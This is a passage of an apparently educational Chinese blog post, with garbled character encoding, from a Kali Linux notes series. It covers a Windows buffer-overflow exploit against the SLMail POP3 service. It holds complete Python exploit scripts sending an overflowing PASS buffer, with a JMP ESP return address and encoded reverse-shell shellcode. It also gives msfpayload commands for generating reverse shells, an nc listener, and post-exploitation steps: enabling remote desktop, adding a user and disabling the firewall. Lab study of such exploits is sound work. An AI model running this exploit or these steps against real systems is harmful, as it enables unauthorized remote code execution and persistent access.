<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;B&apos;*4+&apos;C&apos;*(3500-2607-4)</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IPåœ°å€&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>


<h4 id="7-FUZZING"><a href="#7-FUZZING" class="headerlink" title="7. FUZZING"></a>7. FUZZING</h4><ul>
<li>ä¸åŒç±»å‹çš„ç¨‹åºã€åè®®ã€æ¼æ´ï¼Œä¼šå°†æŸäº›å­—ç¬¦è®¤ä¸ºæ˜¯åå­—ç¬¦ï¼Œè¿™äº›å­—ç¬¦æœ‰å›ºå®šç”¨é€”<ul>
<li>è¿”å›åœ°å€ã€Shellcodeã€bufferä¸­éƒ½ä¸èƒ½å‡ºç°åå­—ç¬¦</li>
<li>null byteï¼ˆ0x00ï¼‰ç©ºå­—ç¬¦ï¼Œç”¨äºç»ˆæ­¢å­—ç¬¦ä¸²æ‹·è´çš„æ“ä½œ</li>
<li>returnï¼ˆ0x0Dï¼‰å›è½¦æ“ä½œï¼Œè¡¨ç¤ºPOP3 PASSå‘½ä»¤è¾“å…¥å®Œæˆ</li>
<li>æ€è·¯ï¼šå‘é€0x00â€“0xff 256ä¸ªå­—ç¬¦ï¼ŒæŸ¥æ‰¾æ‰€æœ‰çš„åå­—ç¬¦</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./07.py</code></strong>ï¼ˆæŸ¥æ‰¾åå­—ç¬¦ï¼‰</li>
<li>0x0Aï¼ˆå¯¼è‡´åé¢æ•°æ®æ— æ³•å‡ºç°ï¼‰</li>
<li>0x0Dï¼ˆè¢«è¿‡æ»¤ï¼‰</li>
<li>0x00ï¼ˆè¢«è¿‡æ»¤ï¼‰</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>å­—ç¬¦ä¼ è¿›å¯„å­˜å™¨ï¼Œå¯èƒ½ä¼šè¢«è¿‡æ»¤ï¼Œä¹Ÿå¯èƒ½ä½¿æœåŠ¡ç«¯carsh</code></pre></blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">badchars=&#123;&#125;</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;B&apos;*4+badchars</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IPåœ°å€&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>

<h4 id="8-FUZZING"><a href="#8-FUZZING" class="headerlink" title="8. FUZZING"></a>8. FUZZING</h4><ul>
<li>é‡å®šå‘æ•°æ®æµ<ul>
<li>ç”¨ESPçš„åœ°å€æ›¿æ¢EIPçš„å€¼</li>
<li>ä½†æ˜¯ESPåœ°å€å˜åŒ–ï¼Œç¡¬ç¼–ç ä¸å¯è¡Œï¼ˆæ¯æ¬¡æ“ä½œç³»ç»Ÿéšæœºåˆ†é…ï¼‰</li>
<li>SLMailçº¿ç¨‹åº”ç”¨ç¨‹åºï¼Œæ“ä½œç³»ç»Ÿä¸ºæ¯ä¸ªçº¿ç¨‹åˆ†é…ä¸€æ®µåœ°å€èŒƒå›´ï¼Œæ¯ä¸ªçº¿ç¨‹åœ°å€èŒƒå›´ä½¿ä¸ç¡®å®šçš„</li>
</ul>
</li>
<li>å˜é€šæ€è·¯<ul>
<li>åœ¨å†…å­˜ä¸­å¯»æ‰¾åœ°å€å›ºå®šçš„ç³»ç»Ÿæ¨¡å—</li>
<li>åœ¨æ¨¡å—ä¸­å¯»æ‰¾JMP ESPæŒ‡å®šçš„åœ°å€è·³è½¬ï¼Œå†ç”±è¯¥æŒ‡ä»¤é—´æ¥è·³è½¬åˆ°ESPï¼Œä»è€Œæ‰§è¡ŒShellcode</li>
<li>mono.pyè„šæœ¬è¯†åˆ«å†…å­˜æ¨¡å—ï¼Œæœç´¢â€return addressâ€æ˜¯JMP ESPæŒ‡ä»¤çš„æ¨¡å—</li>
<li>å¯»æ‰¾æ— DEPã€ALSRä¿æŠ¤çš„å†…å­˜åœ°å€</li>
<li>å†…å­˜åœ°å€ä¸åŒ…å«åå­—ç¬¦</li>
</ul>
</li>
</ul>
<h4 id="9-FUZZING"><a href="#9-FUZZING" class="headerlink" title="9. FUZZING"></a>9. FUZZING</h4><ul>
<li>å¯»æ‰¾ä¸å—ä¿æŠ¤çš„ç³»ç»Ÿæ¨¡å—<ul>
<li>!mona modules</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>Rebaseï¼šæ“ä½œç³»ç»Ÿé‡å¯ï¼Œå†…å­˜åœ°å€æ˜¯å¦å‘ç”Ÿå˜åŒ–ï¼ŒåŸºåœ°å€å˜åŒ–ï¼Œä¸ºFalse
SafeSEHã€ASLRï¼šæ“ä½œç³»ç»Ÿæä¾›çš„å†…å­˜ä¿æŠ¤æœºåˆ¶ï¼Œä¸ºFalse
OS DLLï¼šæ“ä½œç³»ç»Ÿè‡ªå¸¦çš„åŠ¨æ€é“¾æ¥åº“ï¼Œä¸ºTrue</code></pre></blockquote>
<ul>
<li>å°†æ±‡ç¼–æŒ‡ä»¤JMP ESPè½¬æ¢ä¸ºäºŒè¿›åˆ¶<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./nasm shell</code></strong></li>
<li>FFE4</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>msfè„šæœ¬å·¥å…·ï¼š
/usr/share/metasploit-framwork/tools/nasm_shell rbï¼ˆæ±‡ç¼–è¯­è¨€è½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼‰</code></pre></blockquote>
<ul>
<li>åœ¨æ¨¡å—ä¸­æœç´¢FFE4æŒ‡ä»¤<ul>
<li>ï¼mona find -s â€œ\xFF\xE4â€(JMP ESPå¯¹åº”çš„äºŒè¿›åˆ¶æŒ‡ä»¤) -m openc32.dll</li>
<li>ï¼mona find -s â€œ\xFF\xE4â€(JMP ESPå¯¹åº”çš„äºŒè¿›åˆ¶æŒ‡ä»¤) -m mfc42.dll</li>
<li>ï¼mona find -s â€œ\xFF\xE4â€(JMP ESPå¯¹åº”çš„äºŒè¿›åˆ¶æŒ‡ä»¤) -m slmfc.dll</li>
<li>é€‰æ‹©ä¸åŒ…å«åå­—ç¬¦çš„å†…å­˜åœ°å€</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>åˆ‡æ¢æ±‡ç¼–è¯­è¨€è¡¨ç¤ºå½¢å¼ï¼šDisassemble
Memory Mapå†…å­˜åœ°å€å›¾æŸ¥çœ‹æ¨¡å—å¯¹åº”çš„åŸºåœ°å€æ˜¯å¦æ”¶åˆ°DEP,ALSRçš„ä¿æŠ¤ï¼Œæ˜¯å¦éœ€è¦ç»•è¿‡
â–²ç»•è¿‡DEPçš„ä¸€ç§æ–¹æ³•ï¼šMenmory Mapä¸­çš„å¯¹åº”çš„åŸºå€çš„Pocesséœ€ä¸ºï¼ˆREå¯è¯»å¯æ‰§è¡Œï¼‰</code></pre></blockquote>
<ul>
<li>åœ¨è¯¥åœ°å€è®¾ç½®æ–­ç‚¹<ul>
<li>è®¾ç½®æ–­ç‚¹ï¼šå³é”® â†’ BreakPoint â†’ Memory on acess</li>
<li>Debug â†’ Step infoå•æ­¥æ‰§è¡Œ</li>
</ul>
</li>
<li>é‡å‘bufferï¼ˆå°ç«¯å­˜å‚¨ â†’ åœ°å€å®Œå…¨ç¿»è½¬ï¼‰<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./08.py</code></strong>ï¼ˆæŸ¥çœ‹æ¨¡å—æŒ‡ä»¤çš„åœ°å€æ˜¯å¦ä¸ºESPçš„åœ°å€ï¼‰</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;\x8f\x35\x4a\x5f&apos;+&apos;C&apos;*390</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IPåœ°å€&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>

<h4 id="10-FUZZING"><a href="#10-FUZZING" class="headerlink" title="10. FUZZING"></a>10. FUZZING</h4><ul>
<li>ç”ŸæˆShellcodeï¼ˆæ³¨æ„åå­—ç¬¦ï¼‰</li>
<li>Scratchï¼ˆå†™Shellcodeçš„å·¥å…·ï¼‰</li>
<li>cd /usr/share/framework2</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./msfpayload -l</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./msfpayload win32_reverse LHOST=åå‘IPåœ°å€ LPORT=åå‘ç«¯å£ C</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./msfpayload win32_reverse LHOST=IPåœ°å€ LPORT=443 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;</code></strong>ï¼ˆæœ€åéœ€è¦ç”¨â€+â€è¿›è¡Œè¿æ¥ï¼‰</li>
</ul>
<blockquote>
<pre><code>win32_adduser å¢åŠ ç”¨æˆ·çš„Shellcode
win32_bind    å¢åŠ ç›‘å¬çš„è¿›ç¨‹ï¼Œå¯ä»¥å¼€å¯ç›¸åº”çš„ç«¯å£
â–² æ­£å‘çš„bindåŸºæœ¬ä¸Šä¼šè¢«é˜²ç«å¢™è¿‡æ»¤
â–² åå‘ï¼ˆreserverï¼‰çš„bindï¼ŒæœåŠ¡ç«¯ä¼šå¼€æ”¾ç«¯å£ï¼Œä¸»åŠ¨è¿æ¥å¤–éƒ¨ç½‘ç»œ
â–² msfencodeå¯å¯¹Shellcodeåšå…æ€ï¼Œä¹Ÿå¯ä»¥ç¼–æ‰åå­—ç¬¦ï¼Œè¿›è¡Œç¼–ç éœ€è¦æŒ‡å®šåŸå§‹æ ¼å¼ R</code></pre></blockquote>
<ul>
<li>**`ğŸ”ºå‘½ä»¤ï¼šnc -vlp 443</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./09.py</code></strong>ï¼ˆè„šæœ¬åé—¨ï¼‰</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">shellcode=(</span><br><span class="line">&quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x7c\xac\x3f&quot;+</span><br><span class="line">&quot;\xac\x83\xeb\xfc\xe2\xf4\x80\xc6\xd4\xe1\x94\x55\xc0\x53\x83\xcc&quot;+</span><br><span class="line">&quot;\xb4\xc0\x58\x88\xb4\xe9\x40\x27\x43\xa9\x04\xad\xd0\x27\x33\xb4&quot;+</span><br><span class="line">&quot;\xb4\xf3\x5c\xad\xd4\xe5\xf7\x98\xb4\xad\x92\x9d\xff\x35\xd0\x28&quot;+</span><br><span class="line">&quot;\xff\xd8\x7b\x6d\xf5\xa1\x7d\x6e\xd4\x58\x47\xf8\x1b\x84\x09\x49&quot;+</span><br><span class="line">&quot;\xb4\xf3\x58\xad\xd4\xca\xf7\xa0\x74\x27\x23\xb0\x3e\x47\x7f\x80&quot;+</span><br><span class="line">&quot;\xb4\x25\x10\x88\x23\xcd\xbf\x9d\xe4\xc8\xf7\xef\x0f\x27\x3c\xa0&quot;+</span><br><span class="line">&quot;\xb4\xdc\x60\x01\xb4\xec\x74\xf2\x57\x22\x32\xa2\xd3\xfc\x83\x7a&quot;+</span><br><span class="line">&quot;\x59\xff\x1a\xc4\x0c\x9e\x14\xdb\x4c\x9e\x23\xf8\xc0\x7c\x14\x67&quot;+</span><br><span class="line">&quot;\xd2\x50\x47\xfc\xc0\x7a\x23\x25\xda\xca\xfd\x41\x37\xae\x29\xc6&quot;+</span><br><span class="line">&quot;\x3d\x53\xac\xc4\xe6\xa5\x89\x01\x68\x53\xaa\xff\x6c\xff\x2f\xef&quot;+</span><br><span class="line">&quot;\x6c\xef\x2f\x53\xef\xc4\xbc\x04\x5b\xc6\x1a\xc4\x3e\x17\x1a\xff&quot;+</span><br><span class="line">&quot;\xb6\x4d\xe9\xc4\xd3\x55\xd6\xcc\x68\x53\xaa\xc6\x2f\xfd\x29\x53&quot;+</span><br><span class="line">&quot;\xef\xca\x16\xc8\x59\xc4\x1f\xc1\x55\xfc\x25\x85\xf3\x25\x9b\xc6&quot;+</span><br><span class="line">&quot;\x7b\x25\x9e\x9d\xff\x5f\xd6\x39\xb6\x51\x82\xee\x12\x52\x3e\x80&quot;+</span><br><span class="line">&quot;\xb2\xd6\x44\x07\x94\x07\x14\xde\xc1\x1f\x6a\x53\x4a\x84\x83\x7a&quot;+</span><br><span class="line">&quot;\x64\xfb\x2e\xfd\x6e\xfd\x16\xad\x6e\xfd\x29\xfd\xc0\x7c\x14\x01&quot;+</span><br><span class="line">&quot;\xe6\xa9\xb2\xff\xc0\x7a\x16\x53\xc0\x9b\x83\x7c\x57\x4b\x05\x6a&quot;+</span><br><span class="line">&quot;\x46\x53\x09\xa8\xc0\x7a\x83\xdb\xc3\x53\xac\xc4\xcf\x26\x78\xf3&quot;+</span><br><span class="line">&quot;\x6c\x53\xaa\x53\xef\xac&quot;)</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;\x8f\x35\x4a\x5f&apos;+&apos;\x90&apos;*8+shellcode</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IPåœ°å€&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<pre><code>æ±‡ç¼–è¯­è¨€çš„\0x90ï¼Œè¡¨ç¤ºNOPï¼ˆä¸æ“ä½œï¼‰ï¼Œä¸ºäº†ä¿è¯Shellcodeè¿è¡Œæœ‰æ•ˆæ€§ï¼Œä»ç»éªŒä¸Šæ¥è°ˆï¼ŒCPUåœ¨è·³è½¬è§£æçš„æ—¶å€™ï¼Œå¯èƒ½ä¼šæ“¦é™¤ï¼Œè¦†ç›–Shellcodeçš„å‰å‡ ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦åŠ NOPè¿›è¡Œä¸æ“ä½œ</code></pre></blockquote>
<h4 id="11-FUZZING"><a href="#11-FUZZING" class="headerlink" title="11. FUZZING"></a>11. FUZZING</h4><ul>
<li>æ—©æœŸçš„msfpayload<ul>
<li>Shellcodeæ‰§è¡Œåä¼šä¸€ExitProcessæ–¹å¼é€€å‡ºæ•´ä¸ªè¿›ç¨‹ï¼Œå°†å¯¼è‡´é‚®ä»¶æœåŠ¡å´©æºƒ</li>
<li>SLMailæ˜¯ä¸€ä¸ªåŸºäºçº¿ç¨‹çš„åº”ç”¨ï¼Œé€‚ç”¨ExitThreadæ–¹å¼å¯ä»¥é¿å…æ•´ä¸ªç³»ç»Ÿå´©æºƒï¼Œå¯å®ç°é‡å¤æº¢å‡º</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./msfpayload win32_reverser LHOST=åå‘IPåœ°å€ EXITFUNC=thread LPORT=443 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;</code></strong></li>
</ul>
</li>
</ul>
<h4 id="12-FUZZING"><a href="#12-FUZZING" class="headerlink" title="12. FUZZING"></a>12. FUZZING</h4><blockquote>
<pre><code>1.ä¿®æ”¹æ³¨å†Œè¡¨å¼€å¯è¿œç¨‹æ¡Œé¢æ§åˆ¶åéœ€é‡å¯è®¡ç®—æœºï¼ˆshutdown -r -t 0ï¼‰
2.æŸ¥çœ‹è¿œç¨‹æ¡Œé¢æ˜¯å¦å¼€å¯ï¼ˆæˆ‘çš„ç”µè„‘ â†’ å±æ€§ â†’ è¿œç¨‹ï¼‰
3.apt-get install rdesktop
4.rdesktop è¿œç¨‹IP
5.nc -vlp 443 
6.å¢åŠ ç”¨æˆ·ï¼ˆnet user ç”¨æˆ· å¯†ç  /addï¼‰
â–² å¯ä»¥é€šè¿‡æ³¨å†Œè¡¨å…³é—­é˜²ç«å¢™ï¼ˆregsnapå¯æŠ“å–æ³¨å†Œè¡¨å˜åŒ–ï¼‰</code></pre></blockquote>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"># å®‰å…¨</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/12/11/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E5%85%AD)%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%BB%8B%E7%BB%8D/" rel="next" title="Kali Linuxç¬”è®°(äºŒåå…­)ï¼šç¼“å†²åŒºæº¢å‡ºä»‹ç»">
                <i class="fa fa-chevron-left"></i> Kali Linuxç¬”è®°(äºŒåå…­)ï¼šç¼“å†²åŒºæº¢å‡ºä»‹ç»
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/12/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E5%85%AB)%EF%BC%9ALinux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" rel="prev" title="Kali Linuxç¬”è®°(äºŒåå…«)ï¼šLinuxç¼“å†²åŒºæº¢å‡º">
                Kali Linuxç¬”è®°(äºŒåå…«)ï¼šLinuxç¼“å†²åŒºæº¢å‡º <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            æ–‡ç« ç›®å½•
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            ç«™ç‚¹æ¦‚è§ˆ
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/photo.jpg"
                alt="Tomas" />
            
              <p class="site-author-name" itemprop="name">Tomas</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">172</span>
                  <span class="site-state-item-name">æ—¥å¿—</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">åˆ†ç±»</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">10</span>
                  <span class="site-state-item-name">æ ‡ç­¾</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Tomassky" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:tomassky7@gmail.com" target="_blank" title="Gmailé‚®ç®±">
                      
                        <i class="fa fa-fw fa-envelope"></i>Gmailé‚®ç®±</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ylsword-cheat.top" title="LengSword" target="_blank">LengSword</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://neigeshoufu.github.io/ljy.github.io" title="neigeshoufu" target="_blank">neigeshoufu</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-FUZZERï¼ˆwindowç¼“å­˜åŒºæº¢å‡ºï¼‰"><span class="nav-number">1.</span> <span class="nav-text">1. FUZZERï¼ˆwindowç¼“å­˜åŒºæº¢å‡ºï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-FUZZER"><span class="nav-number">2.</span> <span class="nav-text">2. FUZZER</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-POP3"><span class="nav-number">3.</span> <span class="nav-text">3. POP3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-FUZZING"><span class="nav-number">4.</span> <span class="nav-text">4. FUZZING</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-FUZZING"><span class="nav-number">5.</span> <span class="nav-text">5. FUZZING</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-FUZZING"><span class="nav-number">6.</span> <span class="nav-text">6. FUZZING</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-FUZZING"><span class="nav-number">7.</span> <span class="nav-text">7. FUZZING</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-FUZZING"><span class="nav-number">8.</span> <span class="nav-text">8. FUZZING</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9-FUZZING"><span class="nav-number">9.</span> <span class="nav-text">9. FUZZING</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10-FUZZING"><span class="nav-number">10.</span> <span class="nav-text">10. FUZZING</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#11-FUZZING"><span class="nav-number">11.</span> <span class="nav-text">11. FUZZING</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#12-FUZZING"><span class="nav-number">12.</span> <span class="nav-text">12. FUZZING</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Tomas</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">171.9k</span>
  
</div>


  <div class="powered-by">ç”± <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> å¼ºåŠ›é©±åŠ¨</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">ä¸»é¢˜ &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
